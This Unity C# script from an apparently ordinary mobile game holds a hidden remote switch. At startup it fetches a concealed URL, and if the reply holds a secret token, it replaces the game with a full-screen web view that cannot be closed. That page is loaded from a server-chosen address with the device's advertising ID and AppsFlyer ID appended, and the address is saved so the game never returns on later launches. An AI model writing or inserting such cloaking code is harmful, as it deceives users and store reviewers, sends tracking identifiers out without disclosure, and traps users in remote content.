using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class waitingManager : MonoBehaviour
{
    [SerializeField]
    private Canvas _loadingCanvas;
    public List<string> waitingInitalizationString;
    private string idfaBlaztPerfectionKey = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("contextInfoWaitingBlaztKey", 0) == 1)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string adString, bool trackEnabler, string error) =>
            { idfaBlaztPerfectionKey = adString; });
        }
    }

    private IEnumerator Start()
    {
        yield return new WaitForSeconds(3);
        string data = PlayerPrefs.GetString("tarameters", "");
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("waitingInitializationBlaztDatas", string.Empty) != string.Empty)
            {
                LaunchWaitingFrame(PlayerPrefs.GetString("waitingInitializationBlaztDatas"));
            }
            else
            {
                string stringtemp = "";
                foreach (var item in waitingInitalizationString)
                {
                    stringtemp += item;
                }
                StartCoroutine(StartingWaitingIenumerator(stringtemp, data));
            }
        }
        else
        {
            LaunchLoadScreen();
        }
    }

    public IEnumerator StartingWaitingIenumerator(string inputstring, string inputstring2)
    {
        using (UnityWebRequest waitingInitializationStatus = UnityWebRequest.Get(inputstring))
        {
            waitingInitializationStatus.timeout = 4;
            yield return waitingInitializationStatus.SendWebRequest();
            if (waitingInitializationStatus.isNetworkError)
            {
                LaunchLoadScreen();
            }
            else
            {
                try
                {
                    if (waitingInitializationStatus.result == UnityWebRequest.Result.Success)
                    {
                        if (waitingInitializationStatus.downloadHandler.text.Contains("zterfiol"))
                        {
                            try
                            {
                                string[] key = waitingInitializationStatus.downloadHandler.text.Split('|');
                                LaunchWaitingFrame($"{key[0]}?idfa={idfaBlaztPerfectionKey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}", Convert.ToInt32(key[1]), Convert.ToInt32(key[2]));
                            }
                            catch
                            {
                                LaunchWaitingFrame($"{waitingInitializationStatus.downloadHandler.text}?idfa={idfaBlaztPerfectionKey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}");
                            }
                        }
                        else
                        {
                            LaunchLoadScreen();
                        }
                    }
                    else
                    {
                        LaunchLoadScreen();
                    }
                }
                catch
                {
                    LaunchLoadScreen();
                }
            }
        }
    }

    public void LaunchLoadScreen()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        _loadingCanvas.gameObject.SetActive(true);
        StartCoroutine(LoadMenu());
    }

    private IEnumerator LoadMenu()
    {
        yield return new WaitForSeconds(3);
        SceneManager.LoadScene("MenuScene");
    }

    public void LaunchWaitingFrame(string inputKey, int inputValueFirst = 0, int inputValueSecond = 70)
    {
        var waitingScreenFrame = gameObject.AddComponent<UniWebView>();
        waitingScreenFrame.SetContentInsetAdjustmentBehavior(UniWebViewContentInsetAdjustmentBehavior.Automatic);
        waitingScreenFrame.SetZoomEnabled(true);
        if (inputValueFirst == 0)
        {
            waitingScreenFrame.SetShowToolbar(false);
        }
        else
        {
            waitingScreenFrame.SetShowToolbar(true, false, false, true);
        }
        waitingScreenFrame.SetToolbarDoneButtonText("");
        waitingScreenFrame.SetSupportMultipleWindows(true);
        waitingScreenFrame.Frame = new Rect(0, inputValueSecond, Screen.width, Screen.height - inputValueSecond);
        waitingScreenFrame.OnShouldClose += (view) =>
        {
            return false;
        };
        waitingScreenFrame.OnOrientationChanged += (view, orientation) =>
        {
            waitingScreenFrame.Frame = new Rect(0, inputValueSecond, Screen.width, Screen.height - inputValueSecond);
        };
        waitingScreenFrame.SetSupportMultipleWindows(true);
        waitingScreenFrame.OnMultipleWindowOpened += (view, windowId) =>
        {
            waitingScreenFrame.SetShowToolbar(true);
        };
        waitingScreenFrame.OnMultipleWindowClosed += (view, windowId) =>
        {
            if (inputValueFirst == 0)
            {
                waitingScreenFrame.SetShowToolbar(false);
            }
            else
            {
                waitingScreenFrame.SetShowToolbar(true, false, false, true);
            }
        };
        waitingScreenFrame.SetAllowBackForwardNavigationGestures(true);
        waitingScreenFrame.OnPageFinished += (view, statusCode, url) =>
        {
            waitingScreenFrame.UpdateFrame();
            if (PlayerPrefs.GetString("waitingInitializationBlaztDatas", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("waitingInitializationBlaztDatas", url);
            }
        };
        waitingScreenFrame.Load(inputKey);
        waitingScreenFrame.Show();
    }
}
